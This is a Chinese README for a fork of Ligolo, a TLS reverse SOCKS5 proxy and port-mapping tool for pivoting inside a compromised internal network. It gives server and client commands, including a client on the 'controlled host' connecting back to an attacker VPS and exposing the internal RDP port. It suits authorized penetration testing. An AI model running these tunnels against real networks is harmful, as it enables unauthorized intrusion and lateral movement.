# Ligolo : 用于内网渗透的反向隧道

[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/gluten-free.svg)](https://forthebadge.com)

简体中文 | [English](./README_EN.md)

## 介绍

项目根据 [ligolo](https://github.com/sysdream/ligolo) 修改,主要做一些功能上的裁剪,方便使用.

**Ligolo** 是一个简单的,轻量级的反向Socks5代理工具及端口映射工具,所有的流量使用TLS加密.

其功能类似于*Meterpreter*中的*Autoroute + Socks4a*,但是更加稳定,速度更快.

## 使用场景

当你已经在对方内网获取到一台 Windows / Linux / Mac 主机的权限且该主机可以连接互联网.

此时你想要建立一个对方内网的Socks5代理或需要连接内网某个IP地址的某端口.

**Ligolo** 可以帮助你建立代理,协助你继续进行内网渗透.

> 如果已控主机不能访问互联网,可以尝试使用另一款工具 [pystinger](https://github.com/FunnyWolf/pystinger)

## 使用方法

### Sock5代理

- 获取已编译的二进制文件 [release](https://github.com/FunnyWolf/ligolo/releases)

- 在你的VPS主机中.

```
./ligolos
```

- 在已控制的内网主机中.

```
> ligoloc.exe -s your-vps-ip:443
```

- 连接建立成功后,此时VPS的127.0.0.1:1080已经建立已控主机的内网Socks5代理.

### 详细说明

*Ligolo* 包含两个模块:

- ligolos (server)
- ligoloc (client)

*ligolos* 运行于你的VPS服务器 (攻击服务器).

*ligoloc* 运行于已经控制的内网主机.

*ligolos*可以使用默认设置.它会监听0.0.0.0:443端口(用于等待ligoloc连接)及127.0.0.1:1080(用于socks5代理).

*ligoloc*运行时必须制定服务端地址,使用参数`-s your-vps-ip:443`.

你可以使用`-h`参数查看帮助.

一旦*ligolos* 和 *ligoloc* 之间的连接建立成功,你即可使用VPS服务器`127.0.0.1:1080`的内网socks5代理.


### 反向端口映射
- 在你的VPS主机中.

```
./ligolos -p 0.0.0.0:13389
```

- 在已控制的内网主机中.

```
> ligoloc.exe -s your-vps-ip:443 -t 127.0.0.1:3389
```

- 连接建立成功后,已经将以控制内网主机的3389映射到VPS-IP:13389.



### 选项

*ligolos* options:

```
PS D:\xxx\bin> .\ligolos.exe -h
Usage of D:\xxx\ligolos.exe:
  -cert string
        The TLS server certificate,Unnecessary (default "cert.pem")
  -key string
        The TLS server key,Unnecessary (default "key.pem")
  -l string
        The relay server listening address (the connect-back address) (default "0.0.0.0:443")
  -p string
        The local socks5 server address or ip:port use to connect target (default "127.0.0.1:1080")
```

*ligoloc* options:

```
Usage of D:\XXX\ligoloc.exe:
  -proxy string
        Use proxy to connect ligolo server(e.g. http://user:passwd@192.168.1.128:8080 socks5://user:passwd@192.168.1.128:1080)
  -s string
        The ligolo server (the connect-back address)(e.g. 0.0.0.0:443)
  -t string
        The destination server (a 192.168.1.3:3389, 192.168.1.3:22, etc.) - when not specified, Ligolo starts a socks5 proxy server
```

### 编译

参考原版ligolo的编译方法

## 特性

- TLS 1.3 加密隧道
- 多平台 (Windows / Linux / Mac / ...)
- 多连接复用 (1 TCP连接传输所有流量)
- SOCKS5代理

## To Do

- 更好的超时机制
- SOCKS5 UDP 支持
- mTLS双向认证

## Licensing

GNU General Public License v3.0 (参考 LICENSING).

## 原版作者

* Nicolas Chatelain <n.chatelain -at- sysdream.com>



